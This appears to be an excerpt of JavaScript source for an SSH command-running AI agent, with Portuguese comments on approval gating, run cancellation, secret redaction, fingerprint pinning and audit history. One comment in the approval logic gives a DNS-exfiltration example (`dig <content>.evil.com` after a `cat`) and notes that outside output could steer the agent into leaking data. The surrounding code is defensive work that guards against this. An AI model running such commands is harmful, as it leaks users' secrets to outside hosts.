...
const MAX_RUNS = 20;
// Eventos guardados por run para o replay do SSE (reatar/transferir a aba). Sem
// teto, um `journalctl` num agente longo retinha dezenas de MB por run — o
// irmão lib/runner.js já cortava, o agente não.
...
function decidirAprovacao({ comando, modo = 'escrita', isLocal = false, leuSaidaExterna = false, houveNegacao = false }) {
  ...
  if (modo !== 'nunca') {
    ...
    // Terceira camada: comando de LEITURA que fala com um destino escolhido no
    // próprio comando (dig, ping, nc -z, traceroute…). Não altera nada e não lê
    // caminho sensível, mas leva dado para fora — `dig <conteúdo>.evil.com`
    // depois de um `cat` é exfiltração por DNS. Enquanto o agente não leu nada
    // de fora não há o que exfiltrar nem quem o dirija, então o diagnóstico
    // normal (o primeiro `ping -c3 8.8.8.8`) continua rodando sozinho.
    if (classe.rede && leuSaidaExterna) exige = true;
  }
  const motivo = sensivel
    ...
    : (danger
      || (houveNegacao && classe.leitura
        ...
        : null)
      || (classe.rede && leuSaidaExterna && modo !== 'nunca'
        ? 'o comando manda dados para um endereço escolhido dentro dele, depois de o agente já ter lido saída de outro comando'
        : null)
...
function emit(run, event) {
  ...
  // índice 0 é o agent-start: o replay precisa dele para montar o cabeçalho.
...
function stop(run) {
  ...
  // A chamada à API também precisa parar: sem isto o `finalMessage()` só voltava
  // quando o modelo terminasse, o run seguia "executando" e texto continuava
  // entrando no feed DEPOIS de "Parada solicitada pelo analista" — e o token
  // gerado nesse intervalo era cobrado do mesmo jeito.
  try { if (run.streamIA) run.streamIA.abort(); } catch {}
...
// Mata só os comandos LOCAIS ainda em execução. Usada no fechamento do app: o
// filho local nasce detached (grupo de processos próprio) e sobreviveria à
// janela. Não toca em SSH, não emite evento e não muda status — quem fecha o
// app não está cancelando o trabalho, está saindo.
function matarLocais() {
  for (const r of runs.values()) {
    if (r.status !== 'executando' || !r.child) continue;
    try {
      if (process.platform !== 'win32') process.kill(-r.child.pid, 'SIGKILL');
...
// A função mora em lib/redigir.js — os DOIS caminhos que mandam texto para a
// API (este e o assistente de lib/ai.js) usam a mesma. Enquanto ela vivia aqui
// dentro, o assistente não redigia nada: a tela do terminal ia inteira, com a
// senha do cofre em texto claro.
...
async function runAgent(run, { host, goal, options, saveData }) {
  ...
  emit(run, {
    type: 'agent-start',
    goal,
    // A janela que REATA o agente (aba solta) não conhece o modo escolhido e
    // mostrava sempre "Modo supervisionado" — inclusive sobre um agente em modo
    // automático, que apaga e reinicia sem perguntar. O modo viaja no evento.
    aprovacao: options.aprovacao,
    host: {
      name: host.name,
    ...
    try {
      conn = await runner.connect(host, {
        onSaveFingerprint: (fp) => {
          ...
          // a cada renovação, e gravar nele deixava o agente aprendendo o
          // "primeiro contato" toda vez, MITM incluso.
          if (!require('./dadosdecofre').fixarFingerprint(host.id, fp, host)) {
  ...
  for (let step = 0; step < MAX_STEPS; step++) {
    ...
    let final;
    try {
      // 16000 é TETO, não custo: o raciocínio adaptativo conta dentro de
      // max_tokens, e com 4096 um passo que pensasse muito terminava em
      // stop_reason 'max_tokens' — sem tool_use e sem resumo, mas dado como
      // "Tarefa concluída" logo abaixo.
      ...
      // "Parar" aborta o stream: o erro do SDK é consequência do clique, não
      // falha a mostrar como ✗.
      if (run.canceled) break;
      emit(run, { type: 'error', error: err && err.message ? err.message : String(err) });
      break;
    } finally {
    ...
    // Resposta cortada no meio: NÃO é conclusão. Sem este ramo o run fechava
    // como "Tarefa concluída" com o texto truncado e nada feito. Não se reenvia
    // um "continue": o `final.content` já empilhado pode ter raciocínio sem
    // assinatura ou tool_use com JSON parcial, e a chamada seguinte falharia.
    if (final.stop_reason === 'max_tokens') {
      emit(run, { type: 'error', error: 'A resposta do modelo foi cortada pelo limite de tokens — a tarefa NÃO foi concluída.' });
      break;
    }
    ...
    for (const block of final.content) {
      ...
      // Só AQUI o comando entra no histórico: passou pelo portão e vai mesmo
      // para o host. Registrado antes, um comando NEGADO pelo analista ficava
      // gravado igual a um que rodou, e auditar "o que a IA fez no servidor"
      // pelo histórico dava a resposta errada. Fica fora do try de propósito:
      // comando enviado que falhe na execução continua sendo comando enviado.
      history.add({
      ...
      // O timeout de um comando remoto DERRUBA a conexão (runner.js), e o
      // agente reusa a mesma `conn` em todos os passos: sem parar aqui, cada
      // passo seguinte falhava com "Not connected" — até 30 chamadas pagas à
      // API para não fazer nada.
      if (!isLocal && result.timedOut) {
        toolResults.push({ type: 'tool_result', tool_use_id: block.id, is_error: true,
          content: formatResult(out, err, result.code, true) });
        emit(run, { type: 'notice', message: 'Tempo esgotado no comando — a conexão SSH foi encerrada e o agente parou aqui.' });
        conexaoCaiu = true;
        break;
      }
    ...
    if (run.canceled || conexaoCaiu) break;
...
module.exports = {
  // exportada para teste: é a última barreira antes de a saída de um comando
  // ir para a API da Anthropic.
  redigir, start, stop, approve, getRun, subscribe, unsubscribe, dangerousReason, execLocal, decidirAprovacao,
  matarLocais };
